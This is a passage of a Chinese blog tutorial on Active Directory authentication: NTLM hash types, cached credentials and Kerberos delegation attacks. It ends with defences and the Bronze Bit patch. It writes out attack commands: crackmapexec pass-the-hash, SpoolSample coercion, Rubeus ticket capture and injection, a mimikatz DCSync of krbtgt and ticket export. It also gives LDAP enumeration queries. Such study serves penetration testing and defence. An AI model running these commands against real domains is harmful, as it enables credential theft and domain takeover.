+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">crackmapexec</span> <span class="hljs-selector-tag">smb</span> <span class="hljs-number">10.129</span><span class="hljs-selector-class">.41</span><span class="hljs-selector-class">.19</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">rachel</span> <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">e46b9e548fa0d122de7f59fb6d48eaa2</span><br><br><span class="hljs-selector-tag">SMB</span>         <span class="hljs-number">10.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.9</span>     <span class="hljs-number">445</span>    <span class="hljs-selector-tag">DC01</span>      <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-number">10.0</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-number">17763</span> (<span class="hljs-attribute">name</span>:DC01) (<span class="hljs-attribute">domain</span>:INLANEFREIGHT.LOCAL) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)<br><span class="hljs-selector-tag">SMB</span>         <span class="hljs-number">10.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.9</span>     <span class="hljs-number">445</span>    <span class="hljs-selector-tag">DC01</span>      <span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">INLANEFREIGHT</span><span class="hljs-selector-class">.LOCAL</span>\<span class="hljs-selector-tag">rachel</span>:<span class="hljs-selector-tag">e46b9e548fa0d122de7f59fb6d48eaa2</span> (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<p>从 Windows Vista 和 Windows Server 2008 开始，默认情况下，仅存储 NT 哈希。</p>
+<h5 id="NTLMv1（网络-NTMLv1）："><a href="#NTLMv1（网络-NTMLv1）：" class="headerlink" title="NTLMv1（网络-NTMLv1）："></a>NTLMv1（网络-NTMLv1）：</h5><p>NTLM 协议使用 NT 哈希在服务器和客户端之间执行质询/响应。NTLMv1 同时使用 NT 和 LM 哈希，这样可以更容易地在使用<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">Responder</a>等工具或通过<a target="_blank" rel="noopener" href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">NTLM 中继攻击</a>捕获哈希后离线“破解” ，该协议用于网络身份验证，Net-NTLMv1 哈希本身是由质询/响应算法创建的。服务器向客户端发送一个 8 字节的随机数（挑战），客户端返回一个 24 字节的响应。这些哈希不能用于传递哈希攻击。</p>
+<figure class="highlight plaintext"><figcaption><span>哈希示例</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs NTLMv1">u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c<br></code></pre></td></tr></table></figure>
+
+<p>NTLMv1 是现代 NTLM 身份验证的构建块。与任何协议一样，它也存在缺陷并且容易受到破解和其他攻击。</p>
+<h5 id="NTLMv2（网络-NTLMv2）："><a href="#NTLMv2（网络-NTLMv2）：" class="headerlink" title="NTLMv2（网络-NTLMv2）："></a>NTLMv2（网络-NTLMv2）：</h5><p>是在NTLMv1（网络-NTMLv1）基础上改进的，NTLMv2 协议最初是在 Windows NT 4.0 SP4 中引入的，并被创建为 NTLMv1 的更强大的替代方案。自 Server 2000 以来，它一直是 Windows 中的默认设置。它针对 NTLMv1 容易受到的某些欺骗攻击进行了强化。NTLMv2 向服务器收到的 8 字节质询发送两个响应。这些响应包含质询的 16 字节 HMAC-MD5 哈希、来自客户端的随机生成质询以及用户凭据的 HMAC-MD5 哈希。发送第二个响应，使用可变长度的客户端质询，包括当前时间、8 字节随机值和域名。（像kerberos协议每次客户端加密的时间戳，随机数。）</p>
+<figure class="highlight plaintext"><figcaption><span>哈希示例</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs NTLMv2">admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030<br></code></pre></td></tr></table></figure>
+
+<h3 id="域缓存凭据-MSCache2-："><a href="#域缓存凭据-MSCache2-：" class="headerlink" title="域缓存凭据 (MSCache2)："></a>域缓存凭据 (MSCache2)：</h3><p>在 AD 环境中，前面提到的身份验证方法要求我们尝试访问的主机与网络的“大脑”域控制器进行通信。Microsoft 开发了<a target="_blank" rel="noopener" href="https://webstersprodigy.net/2014/02/03/mscash-hash-primer-for-pentesters/">MS Cache v1 和 v2</a>算法（也称为<code>Domain Cached Credentials</code>(DCC)）来解决加入域的主机无法与域控制器通信的潜在问题（即，由于网络中断或其他技术问题），NTLM/Kerberos身份验证无法访问有问题的主机。  于是主机在HKEY_LOCAL_MACHINE\SECURITY\Cache注册表项中为任何成功登录到机器的域用户保存最后10个哈希值。但这些哈希并不能用于传递。</p>
+<p>此外，使用 Hashcat 等工具破解哈希非常慢，即使使用极其强大的 GPU 破解设备也是如此，因此破解这些哈希的尝试通常需要非常有针对性或依赖于使用中的非常弱的密码。这些哈希可以由攻击者或渗透测试者在获得对主机的本地管理员访问权限后获得，并具有以下格式：</p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><span class="hljs-string">$D</span>CC2<span class="hljs-string">$1</span>0240<span class="hljs-symbol">#bjones</span><span class="hljs-symbol">#e4e938d12fe5974dc42a90120bd9c90f</span><br></code></pre></td></tr></table></figure>
+
+<p>作为渗透测试人员，我们必须了解在评估 AD 环境时可能遇到的不同类型的哈希、它们的优势、劣势、它们如何被滥用（破解为明文、传递哈希或中继），以及何时攻击可能是无效的(即，花费数天时间试图破解一组域缓存凭证)。  </p>
+<h3 id="域委派："><a href="#域委派：" class="headerlink" title="域委派："></a>域委派：</h3><p>学习视频链接(<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1564y1Y7HF?spm_id_from=333.1007.top_right_bar_window_history.content.click">https://www.bilibili.com/video/BV1564y1Y7HF?spm_id_from=333.1007.top_right_bar_window_history.content.click</a>)</p>
+<p>参考文章(<a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/#%E5%89%8D%E8%A8%80)%E3%80%82">https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/#%E5%89%8D%E8%A8%80)。</a></p>
+<p>参考链接(<a target="_blank" rel="noopener" href="http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm">http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm</a>)</p>
+<p>域委派是指将用内用户的权限委派给服务账号，使得服务张海能以用户的权限访问域内的其他服务。域委派是大型网络中经常部署的应用模式，给多跳认证带来了很大的便利，但是与此同时也带来了很大的安全隐患。</p>
+<h4 id="委派流程："><a href="#委派流程：" class="headerlink" title="委派流程："></a>委派流程：</h4><p>该图来源于<a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/">https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/</a></p>
+<img src="https://www.worldisend.com/img/image-20220502190821901.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220502190821901" style="zoom:200%;" />
+
+<p>如上图，普通域用户jack以kerberos身份协议认证访问web服务器请求某个文件时候，但真正的文件在后台文件服务器上，于是，Web服务器会通过它自己的服务账号websvc模拟域用户jack通过kerberos身份协议认证继续认证到后台文件服务器，后台文件服务器将文件返回给web服务器，web服务器将文件返回给域用户jack，这就是一个委派的流程。</p>
+<h3 id="委派的分类："><a href="#委派的分类：" class="headerlink" title="委派的分类："></a>委派的分类：</h3><h4 id="非约束性委派-Unconstrained-Delegation"><a href="#非约束性委派-Unconstrained-Delegation" class="headerlink" title="非约束性委派(Unconstrained Delegation):"></a>非约束性委派(Unconstrained Delegation):</h4><p>在Windows Server2000首次发布Active Diretory时，微软提供了一种间的机制来支持用户通过kerberos向web server进行身份验证并需要该用户更新后端数据库服务器上的记录方案。这就是最早的非约束性委派。</p>
+<p>对于非约束性委派，服务账号可以获取被委派用户的TGT，并将TGT缓存到本地LSASS进程中，从而服务账号可以使用该TGT，模拟该用户访问该用户能够访问的任意服务。</p>
+<p>非约束委派的设置需要SeEnableDelegation特权，该特权通常仅授予域管理员。</p>
+<p>非约束性委派有两种情况：</p>
+<p>一种是机器账号的非约束性委派，它的userAccountControl属性有个Flag位WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION，其对应的数是0X81000=528384。</p>
+<p>一种是配置了非约束性委派属性的服务账号，userAccountControl属性有个Flag位NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION,其对应的数是0x80200=524800。</p>
+<h4 id="非约束委派攻击："><a href="#非约束委派攻击：" class="headerlink" title="非约束委派攻击："></a>非约束委派攻击：</h4><p>非约束委派攻击可以利用服务账号与主机账号，因为只有服务账号和主机账号具有委派属性，域用户账号注册SPN之后就成为了服务账号，主机账号的话可以手动去创建。</p>
+<h5 id="第一种基于打印机的利用："><a href="#第一种基于打印机的利用：" class="headerlink" title="第一种基于打印机的利用："></a>第一种基于打印机的利用：</h5><p>tifkin_开源了它的poc</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shanfenglan/</span>test<span class="hljs-regexp">/tree/m</span>aster/spooler<br></code></pre></td></tr></table></figure>
+
+<p>向DC的Spooler服务发送请求，强制其访问USER进行身份验证</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">SpoolSample.exe DC <span class="hljs-keyword">USER</span><br></code></pre></td></tr></table></figure>
+
+<p>用本地的管理员账号打开一个cmd，直接运行命令（如果不用高权限运行的话会报错）</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:5 /filteruser:DC$<br> kekeo<br>/interval:5 设置监听间隔5秒<br>/filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT<br><br>这样可以第一时间截取到域控的TGT<br></code></pre></td></tr></table></figure>
+
+<p>利用Rubeus将base64编码的票据直接注入到内存中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe describe /ticket:<span class="hljs-built_in">base64</span><br>Rubeus.exe ptt /ticket:<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure>
+
+<p>发起DCsync滥用：</p>
+<figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">mimikatz.exe &quot;lsadump::dcsync /domain:networksec.loacl /user:DC\krbtgt<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h5><p>可以诱使域内其他用户来访问配置了非约束性委派的机器，这样的话就能够将该用户TGT缓存到本地LSASS进程中。我就能够获取到该用户的TGT票据。如果访问者是域管理，那我也可以获取到域管理员的TGT，进而访问域控。</p>
+<p>横向到一台开启了unconstrained delegation服务主机，用mimikatz导出TGT（管理员权限）：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br>sekurlsa::tickets /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure>
+
+<p>导入指定票据到当前会话：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::ptt 票据名称<br></code></pre></td></tr></table></figure>
+
+<h4 id="查询非约束委派："><a href="#查询非约束委派：" class="headerlink" title="查询非约束委派："></a>查询非约束委派：</h4><p>主要是通过搜索<strong>userAccountControl</strong>属性包含<strong>ADS_UF_TRUSTED_FOR_DELEGATION</strong>的主机或账户。</p>
+<h5 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h5><p>过滤条件：</p>
+<figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hy">(<span class="hljs-name"><span class="hljs-built_in">&amp;</span></span>(<span class="hljs-name">samAccountType=805306368</span>)(<span class="hljs-name">userAccountControl:1.2.840.113556.1.4.803:=524288</span>))<br></code></pre></td></tr></table></figure>
+
+<p>搜索非约束委派账户：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldapsearch -x -H ldap:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">25.242</span>:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;CN=域用户名,CN=Users,DC=networksec,DC=loacl&quot;</span> -w 域用户密码.  -b <span class="hljs-string">&quot;DC=networksec,DC=loacl&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> |grep -iE <span class="hljs-string">&quot;distinguishedName&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>搜索非约束委派主机：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldapsearch -x -H ldap:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">25.242</span>:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;CN=域用户名,CN=Users,DC=networksec,DC=loacl&quot;</span> -w 域用户密码. -b <span class="hljs-string">&quot;DC=networksec,DC=loacl&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> |grep -iE <span class="hljs-string">&quot;distinguishedName&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>注：区别服务用户和主机的区别是samAccountType=805306368 (0x30000000)时为用户，samAccountType=805306369 (0x30000001)时为主机，而userAccountControl:1.2.840.113556.1.4.803:=524288 则是标识可信任的委派帐户（不受约束的委派）</p>
+<p>更多LDAP的过滤语法请参考微软的手册：<a target="_blank" rel="noopener" href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx?Sort=MostUseful">地址</a></p>
+<h5 id="ADFind"><a href="#ADFind" class="headerlink" title="ADFind:"></a>ADFind:</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">AdFind <span class="hljs-selector-attr">[switches]</span> <span class="hljs-selector-attr">[-b basedn]</span> <span class="hljs-selector-attr">[-f filter]</span> <span class="hljs-selector-attr">[attr list]</span><br><br>参数说明：<br>-b：指定要查询的根节点<br>-f：LDAP过滤条件<br>attr list：需要显示的属性<br><br>查找域中配置非约束委派的用户：<br>.\AdFind<span class="hljs-selector-class">.exe</span>  -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=networksec,DC=loacl&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName<br><br>查找域中配置非约束委派的主机：<br>.\AdFind<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=networksec,DC=loacl&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName<br></code></pre></td></tr></table></figure>
+
+<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView:"></a>PowerView:</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#查找域中配置非约束委派用户<br><span class="hljs-keyword">Get</span>-NetUser -Unconstrained -<span class="hljs-keyword">Domain</span> networksec |<span class="hljs-keyword">select</span> <span class="hljs-type">name</span><br><br>#查找域中配置非约束委派的主机：<br><span class="hljs-keyword">Get</span>-NetComputer -Unconstrained -<span class="hljs-keyword">Domain</span> networksec<br><br>#查询域中配置非约束委派的主机（另外一个版本的powerview）：<br><span class="hljs-keyword">Get</span>-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -<span class="hljs-keyword">Verbose</span> | ft -Wrap -AutoSize<br></code></pre></td></tr></table></figure>
+
+<h4 id="约束性委派-Constrained-Delegation-："><a href="#约束性委派-Constrained-Delegation-：" class="headerlink" title="约束性委派(Constrained Delegation)："></a>约束性委派(Constrained Delegation)：</h4><p>由于非约束性委派的不安全性，微软在Windows Server 2003中发布了约束性委派。同时，为了在Kerberos协议层面对约束性委派的支持，微软扩展了两个子协议S4u2self(Service for User to Self)和S4u2Proxy(Service for User to Proxy)。对于约束性委派(Constrained Delegation)，服务账号只能获取该用户的ST服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的msDS-AllowedToDelegateTo属性会指定对哪个SPN进行委派。约束委派的设置需要SeEnableDelegation特权，该特权通常仅授予域管理员。图片来源于(<a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE">https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE</a>)</p>
+<img src="https://www.worldisend.com/img/image-20220502200324468.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220502200324468" style="zoom:200%;" />
+
+<p>约束性委派与非约束性委派本质上的区别是，非约束性委派的账户能够以用户的TGT请求任何服务。而约束性委派的账户只能以用户的TGT去请求指定的服务。</p>
+<h4 id="约束性委派查找："><a href="#约束性委派查找：" class="headerlink" title="约束性委派查找："></a>约束性委派查找：</h4><h5 id="ldapsearch："><a href="#ldapsearch：" class="headerlink" title="ldapsearch："></a>ldapsearch：</h5><p>过滤条件：</p>
+<figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hy">(<span class="hljs-name"><span class="hljs-built_in">&amp;</span></span>(<span class="hljs-name">samAccountType=805306368</span>)(<span class="hljs-name">msds-allowedtodelegateto=*</span>))<br></code></pre></td></tr></table></figure>
+
+<p>查找域中配置约束委派用户：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldapsearch -x -H ldap:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">25.242</span>:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;CN=域用户,CN=Users,DC=networksec,DC=loacl&quot;</span> -w 域用户密码 -b <span class="hljs-string">&quot;DC=networksec,DC=loacl&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> |grep -iE <span class="hljs-string">&quot;distinguishedName|allowedtodelegateto&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>过滤条件：</p>
+<figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hy">(<span class="hljs-name"><span class="hljs-built_in">&amp;</span></span>(<span class="hljs-name">samAccountType=805306369</span>)(<span class="hljs-name">msds-allowedtodelegateto=*</span>))<br></code></pre></td></tr></table></figure>
+
+<p>查找域中配置约束委派的主机：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldapsearch -x -H ldap:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">25.242</span>:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;CN=域用户,CN=Users,DC=networksec,DC=loacl&quot;</span> -w 域用户密码 -b <span class="hljs-string">&quot;DC=networksec,DC=loacl&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> |grep -iE <span class="hljs-string">&quot;distinguishedName|allowedtodelegateto&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="ADFind："><a href="#ADFind：" class="headerlink" title="ADFind："></a>ADFind：</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#查找用户</span><br>.\AdFind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=networksec,DC=loacl&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn <span class="hljs-keyword">distinguishedName </span>msds-allowedtodelegateto<br><br><span class="hljs-comment">#查找域中配置约束委派的主机</span><br> .\AdFind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=networksec,DC=loacl&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> cn <span class="hljs-keyword">distinguishedName </span>msds-allowedtodelegateto <br></code></pre></td></tr></table></figure>
+
+<h5 id="PowerView："><a href="#PowerView：" class="headerlink" title="PowerView："></a>PowerView：</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#查找域中配置约束委派用户</span><br><span class="hljs-built_in">Get-DomainUser</span> –TrustedToAuth <span class="hljs-literal">-domain</span> 域名全称 <span class="hljs-literal">-Properties</span> distinguishedname,useraccountcontrol,msds<span class="hljs-literal">-allowedtodelegateto</span>|<span class="hljs-built_in">fl</span><br><span class="hljs-comment">#查找域中配置约束委派的主机：</span><br><span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-TrustedToAuth</span> <span class="hljs-literal">-Domain</span> 域名全称 <span class="hljs-literal">-Properties</span> distinguishedname,useraccountcontrol,msds<span class="hljs-literal">-allowedtodelegateto</span>|<span class="hljs-built_in">ft</span> <span class="hljs-literal">-Wrap</span> <span class="hljs-literal">-AutoSize</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="基于资源的约束性委派-RBCD-Resource-Based-Constrained-Delegation-："><a href="#基于资源的约束性委派-RBCD-Resource-Based-Constrained-Delegation-：" class="headerlink" title="基于资源的约束性委派(RBCD:Resource Based Constrained Delegation)："></a>基于资源的约束性委派(RBCD:Resource Based Constrained Delegation)：</h4><p>为了使用户/资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束性委派不需要管理员权限去设置，而是把设置属性的权限赋予了机器自身。基于资源的约束性委派允许资源配置受信任的账户委派给他们，基于资源的约束性委派只能在运行Windows Server 2012 和Windows Server 2012 R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束性委派账户msDS-AllowedToActOnBehalfOfOtherldentity属性的值被允许委派账号SID，并且委派属性这里没有任何值。</p>
+<h5 id="基于资源的约束性委派的优势："><a href="#基于资源的约束性委派的优势：" class="headerlink" title="基于资源的约束性委派的优势："></a>基于资源的约束性委派的优势：</h5><ol>
+<li>委派的权限授予给了拥有资源的后端，而不再是前端。</li>
+<li>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林。</li>
+<li>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehalfOfOtherldentity属性权限，也就是将计算机加入域的域用户和机器自身拥有权限。</li>
+</ol>
+<h5 id="约束性委派和基于资源的约束性委派配置的差别："><a href="#约束性委派和基于资源的约束性委派配置的差别：" class="headerlink" title="约束性委派和基于资源的约束性委派配置的差别："></a>约束性委派和基于资源的约束性委派配置的差别：</h5><ul>
+<li>传统的约束性委派是正向的，通过修改服务账户A的属性msDS-AllowedToDelegateTo，添加服务账户B的SPN，设置约束性委派对象（服务账户B），服务账户A便可模拟用户向域控请求访问服务账户B的ST服务票据。</li>
+<li>而基于资源的约束委派则是相反的，通过修改服务账户B的属性msDS-AllowedToActOnBehalfOfOtherldentity添加服务账户A的SID，达到让服务账户A模拟用户访问服务账户B资源的目的。</li>
+</ul>
+<h5 id="利用基于资源的约束性委派接管域控或权限提升："><a href="#利用基于资源的约束性委派接管域控或权限提升：" class="headerlink" title="利用基于资源的约束性委派接管域控或权限提升："></a>利用基于资源的约束性委派接管域控或权限提升：</h5><p>第一种，结合NTLM Relay接管域控，如CVE-2019-1040。</p>
+<p>第二种，进行本地提权(获取到了将机器加入域的用户的权限或Account Operators组内的用户权限)</p>
+<p>很多企业内部，都会有一个专门将机器加入域的账号，如果能够拿到该账号的权限，则能拿到通过该账号加入域所有机器的system权限。</p>
+<p>如果拿到Account Operators组内用户权限的话，则可以拿到除域控外所有机器的system权限。</p>
+<h5 id="利用基于资源的约束委派打造变种的黄金票据-权限维持-："><a href="#利用基于资源的约束委派打造变种的黄金票据-权限维持-：" class="headerlink" title="利用基于资源的约束委派打造变种的黄金票据(权限维持)："></a>利用基于资源的约束委派打造变种的黄金票据(权限维持)：</h5><p>如果假设服务B为krbtgt，服务A为我所控制的一个账号，配置服务A到服务B基于资源的约束性委派，那么我控制的账户就可以获取KDC(Key Distribution Centre) 服务的ST服务票据(也就是TGT认购权证)。我就可以伪造任何权限用户的TGT认购权证，来打造一个变种的黄金票据了。</p>
+<h4 id="域委派的防御措施："><a href="#域委派的防御措施：" class="headerlink" title="域委派的防御措施："></a>域委派的防御措施：</h4><p>高权限的用户，设置为不能被委派。</p>
+<p>主机账号需设置委派时，只能设置为约束性委派；</p>
+<p>Windows 2012 R2及更高的系统建立了受保护的用户组Protected Users，组内用户不允许被委派，这是有效的手段，受保护的用户组。</p>
+<p>但是以上都可以被绕过，绕过漏洞<strong>Kerberos Bronze Bit(CVE-2020-17049).</strong></p>
+<h5 id="Kerberos-Bronze-Bit-CVE-2020-17049"><a href="#Kerberos-Bronze-Bit-CVE-2020-17049" class="headerlink" title="Kerberos Bronze Bit(CVE-2020-17049):"></a>Kerberos Bronze Bit(CVE-2020-17049):</h5><p>漏洞原理是因为TGS-REP阶段通过S4u2Self协议请求的ST服务票据是使用当前服务账户hash加密的，并且Forwardable标志位不在被微软签名防护的PAC中，而我又知道当前服务账户的hash，因此我可以将ST票据解密，将Forwardable标志位改为1再进行加密生成ST服务票据，这一步是不需要纂改微软PAC签名的，并且KDC验证PAC签名时候也无法察觉到数据包被篡改。这是一个逻辑错误。</p>
+<h5 id="漏洞预防和修复："><a href="#漏洞预防和修复：" class="headerlink" title="漏洞预防和修复："></a>漏洞预防和修复：</h5><p>微软已经发布了该漏洞的补丁程序。补丁编号为KB4598347。可以直接通过自动更新获取。</p>
+<h5 id="修复原理："><a href="#修复原理：" class="headerlink" title="修复原理："></a>修复原理：</h5><p>微软在补丁包中新增了一个票据签名。S4U2Self阶段生成的服务票据，KDC用其密钥在票据上进行了签名，并将签名插入了PAC中，而后PAC又经过两次签名(<strong>使用服务密钥(pac_server_checksum)和使用KDC密钥(PAC_PRIVSVR_CHECKSUM签名)</strong>)。在之后的S4U2Proxy阶段，KDC会验证PAC的三个签名，必须得三个签名都验证通过，KDC才会返回服务票据，否则，KDC将返回KRB_AP_ERR_MODIFIEDX消息。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Active Directory 协议理论</div>
+      <div>http://example.com/2022/10/06/Active Directory 协议理论/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
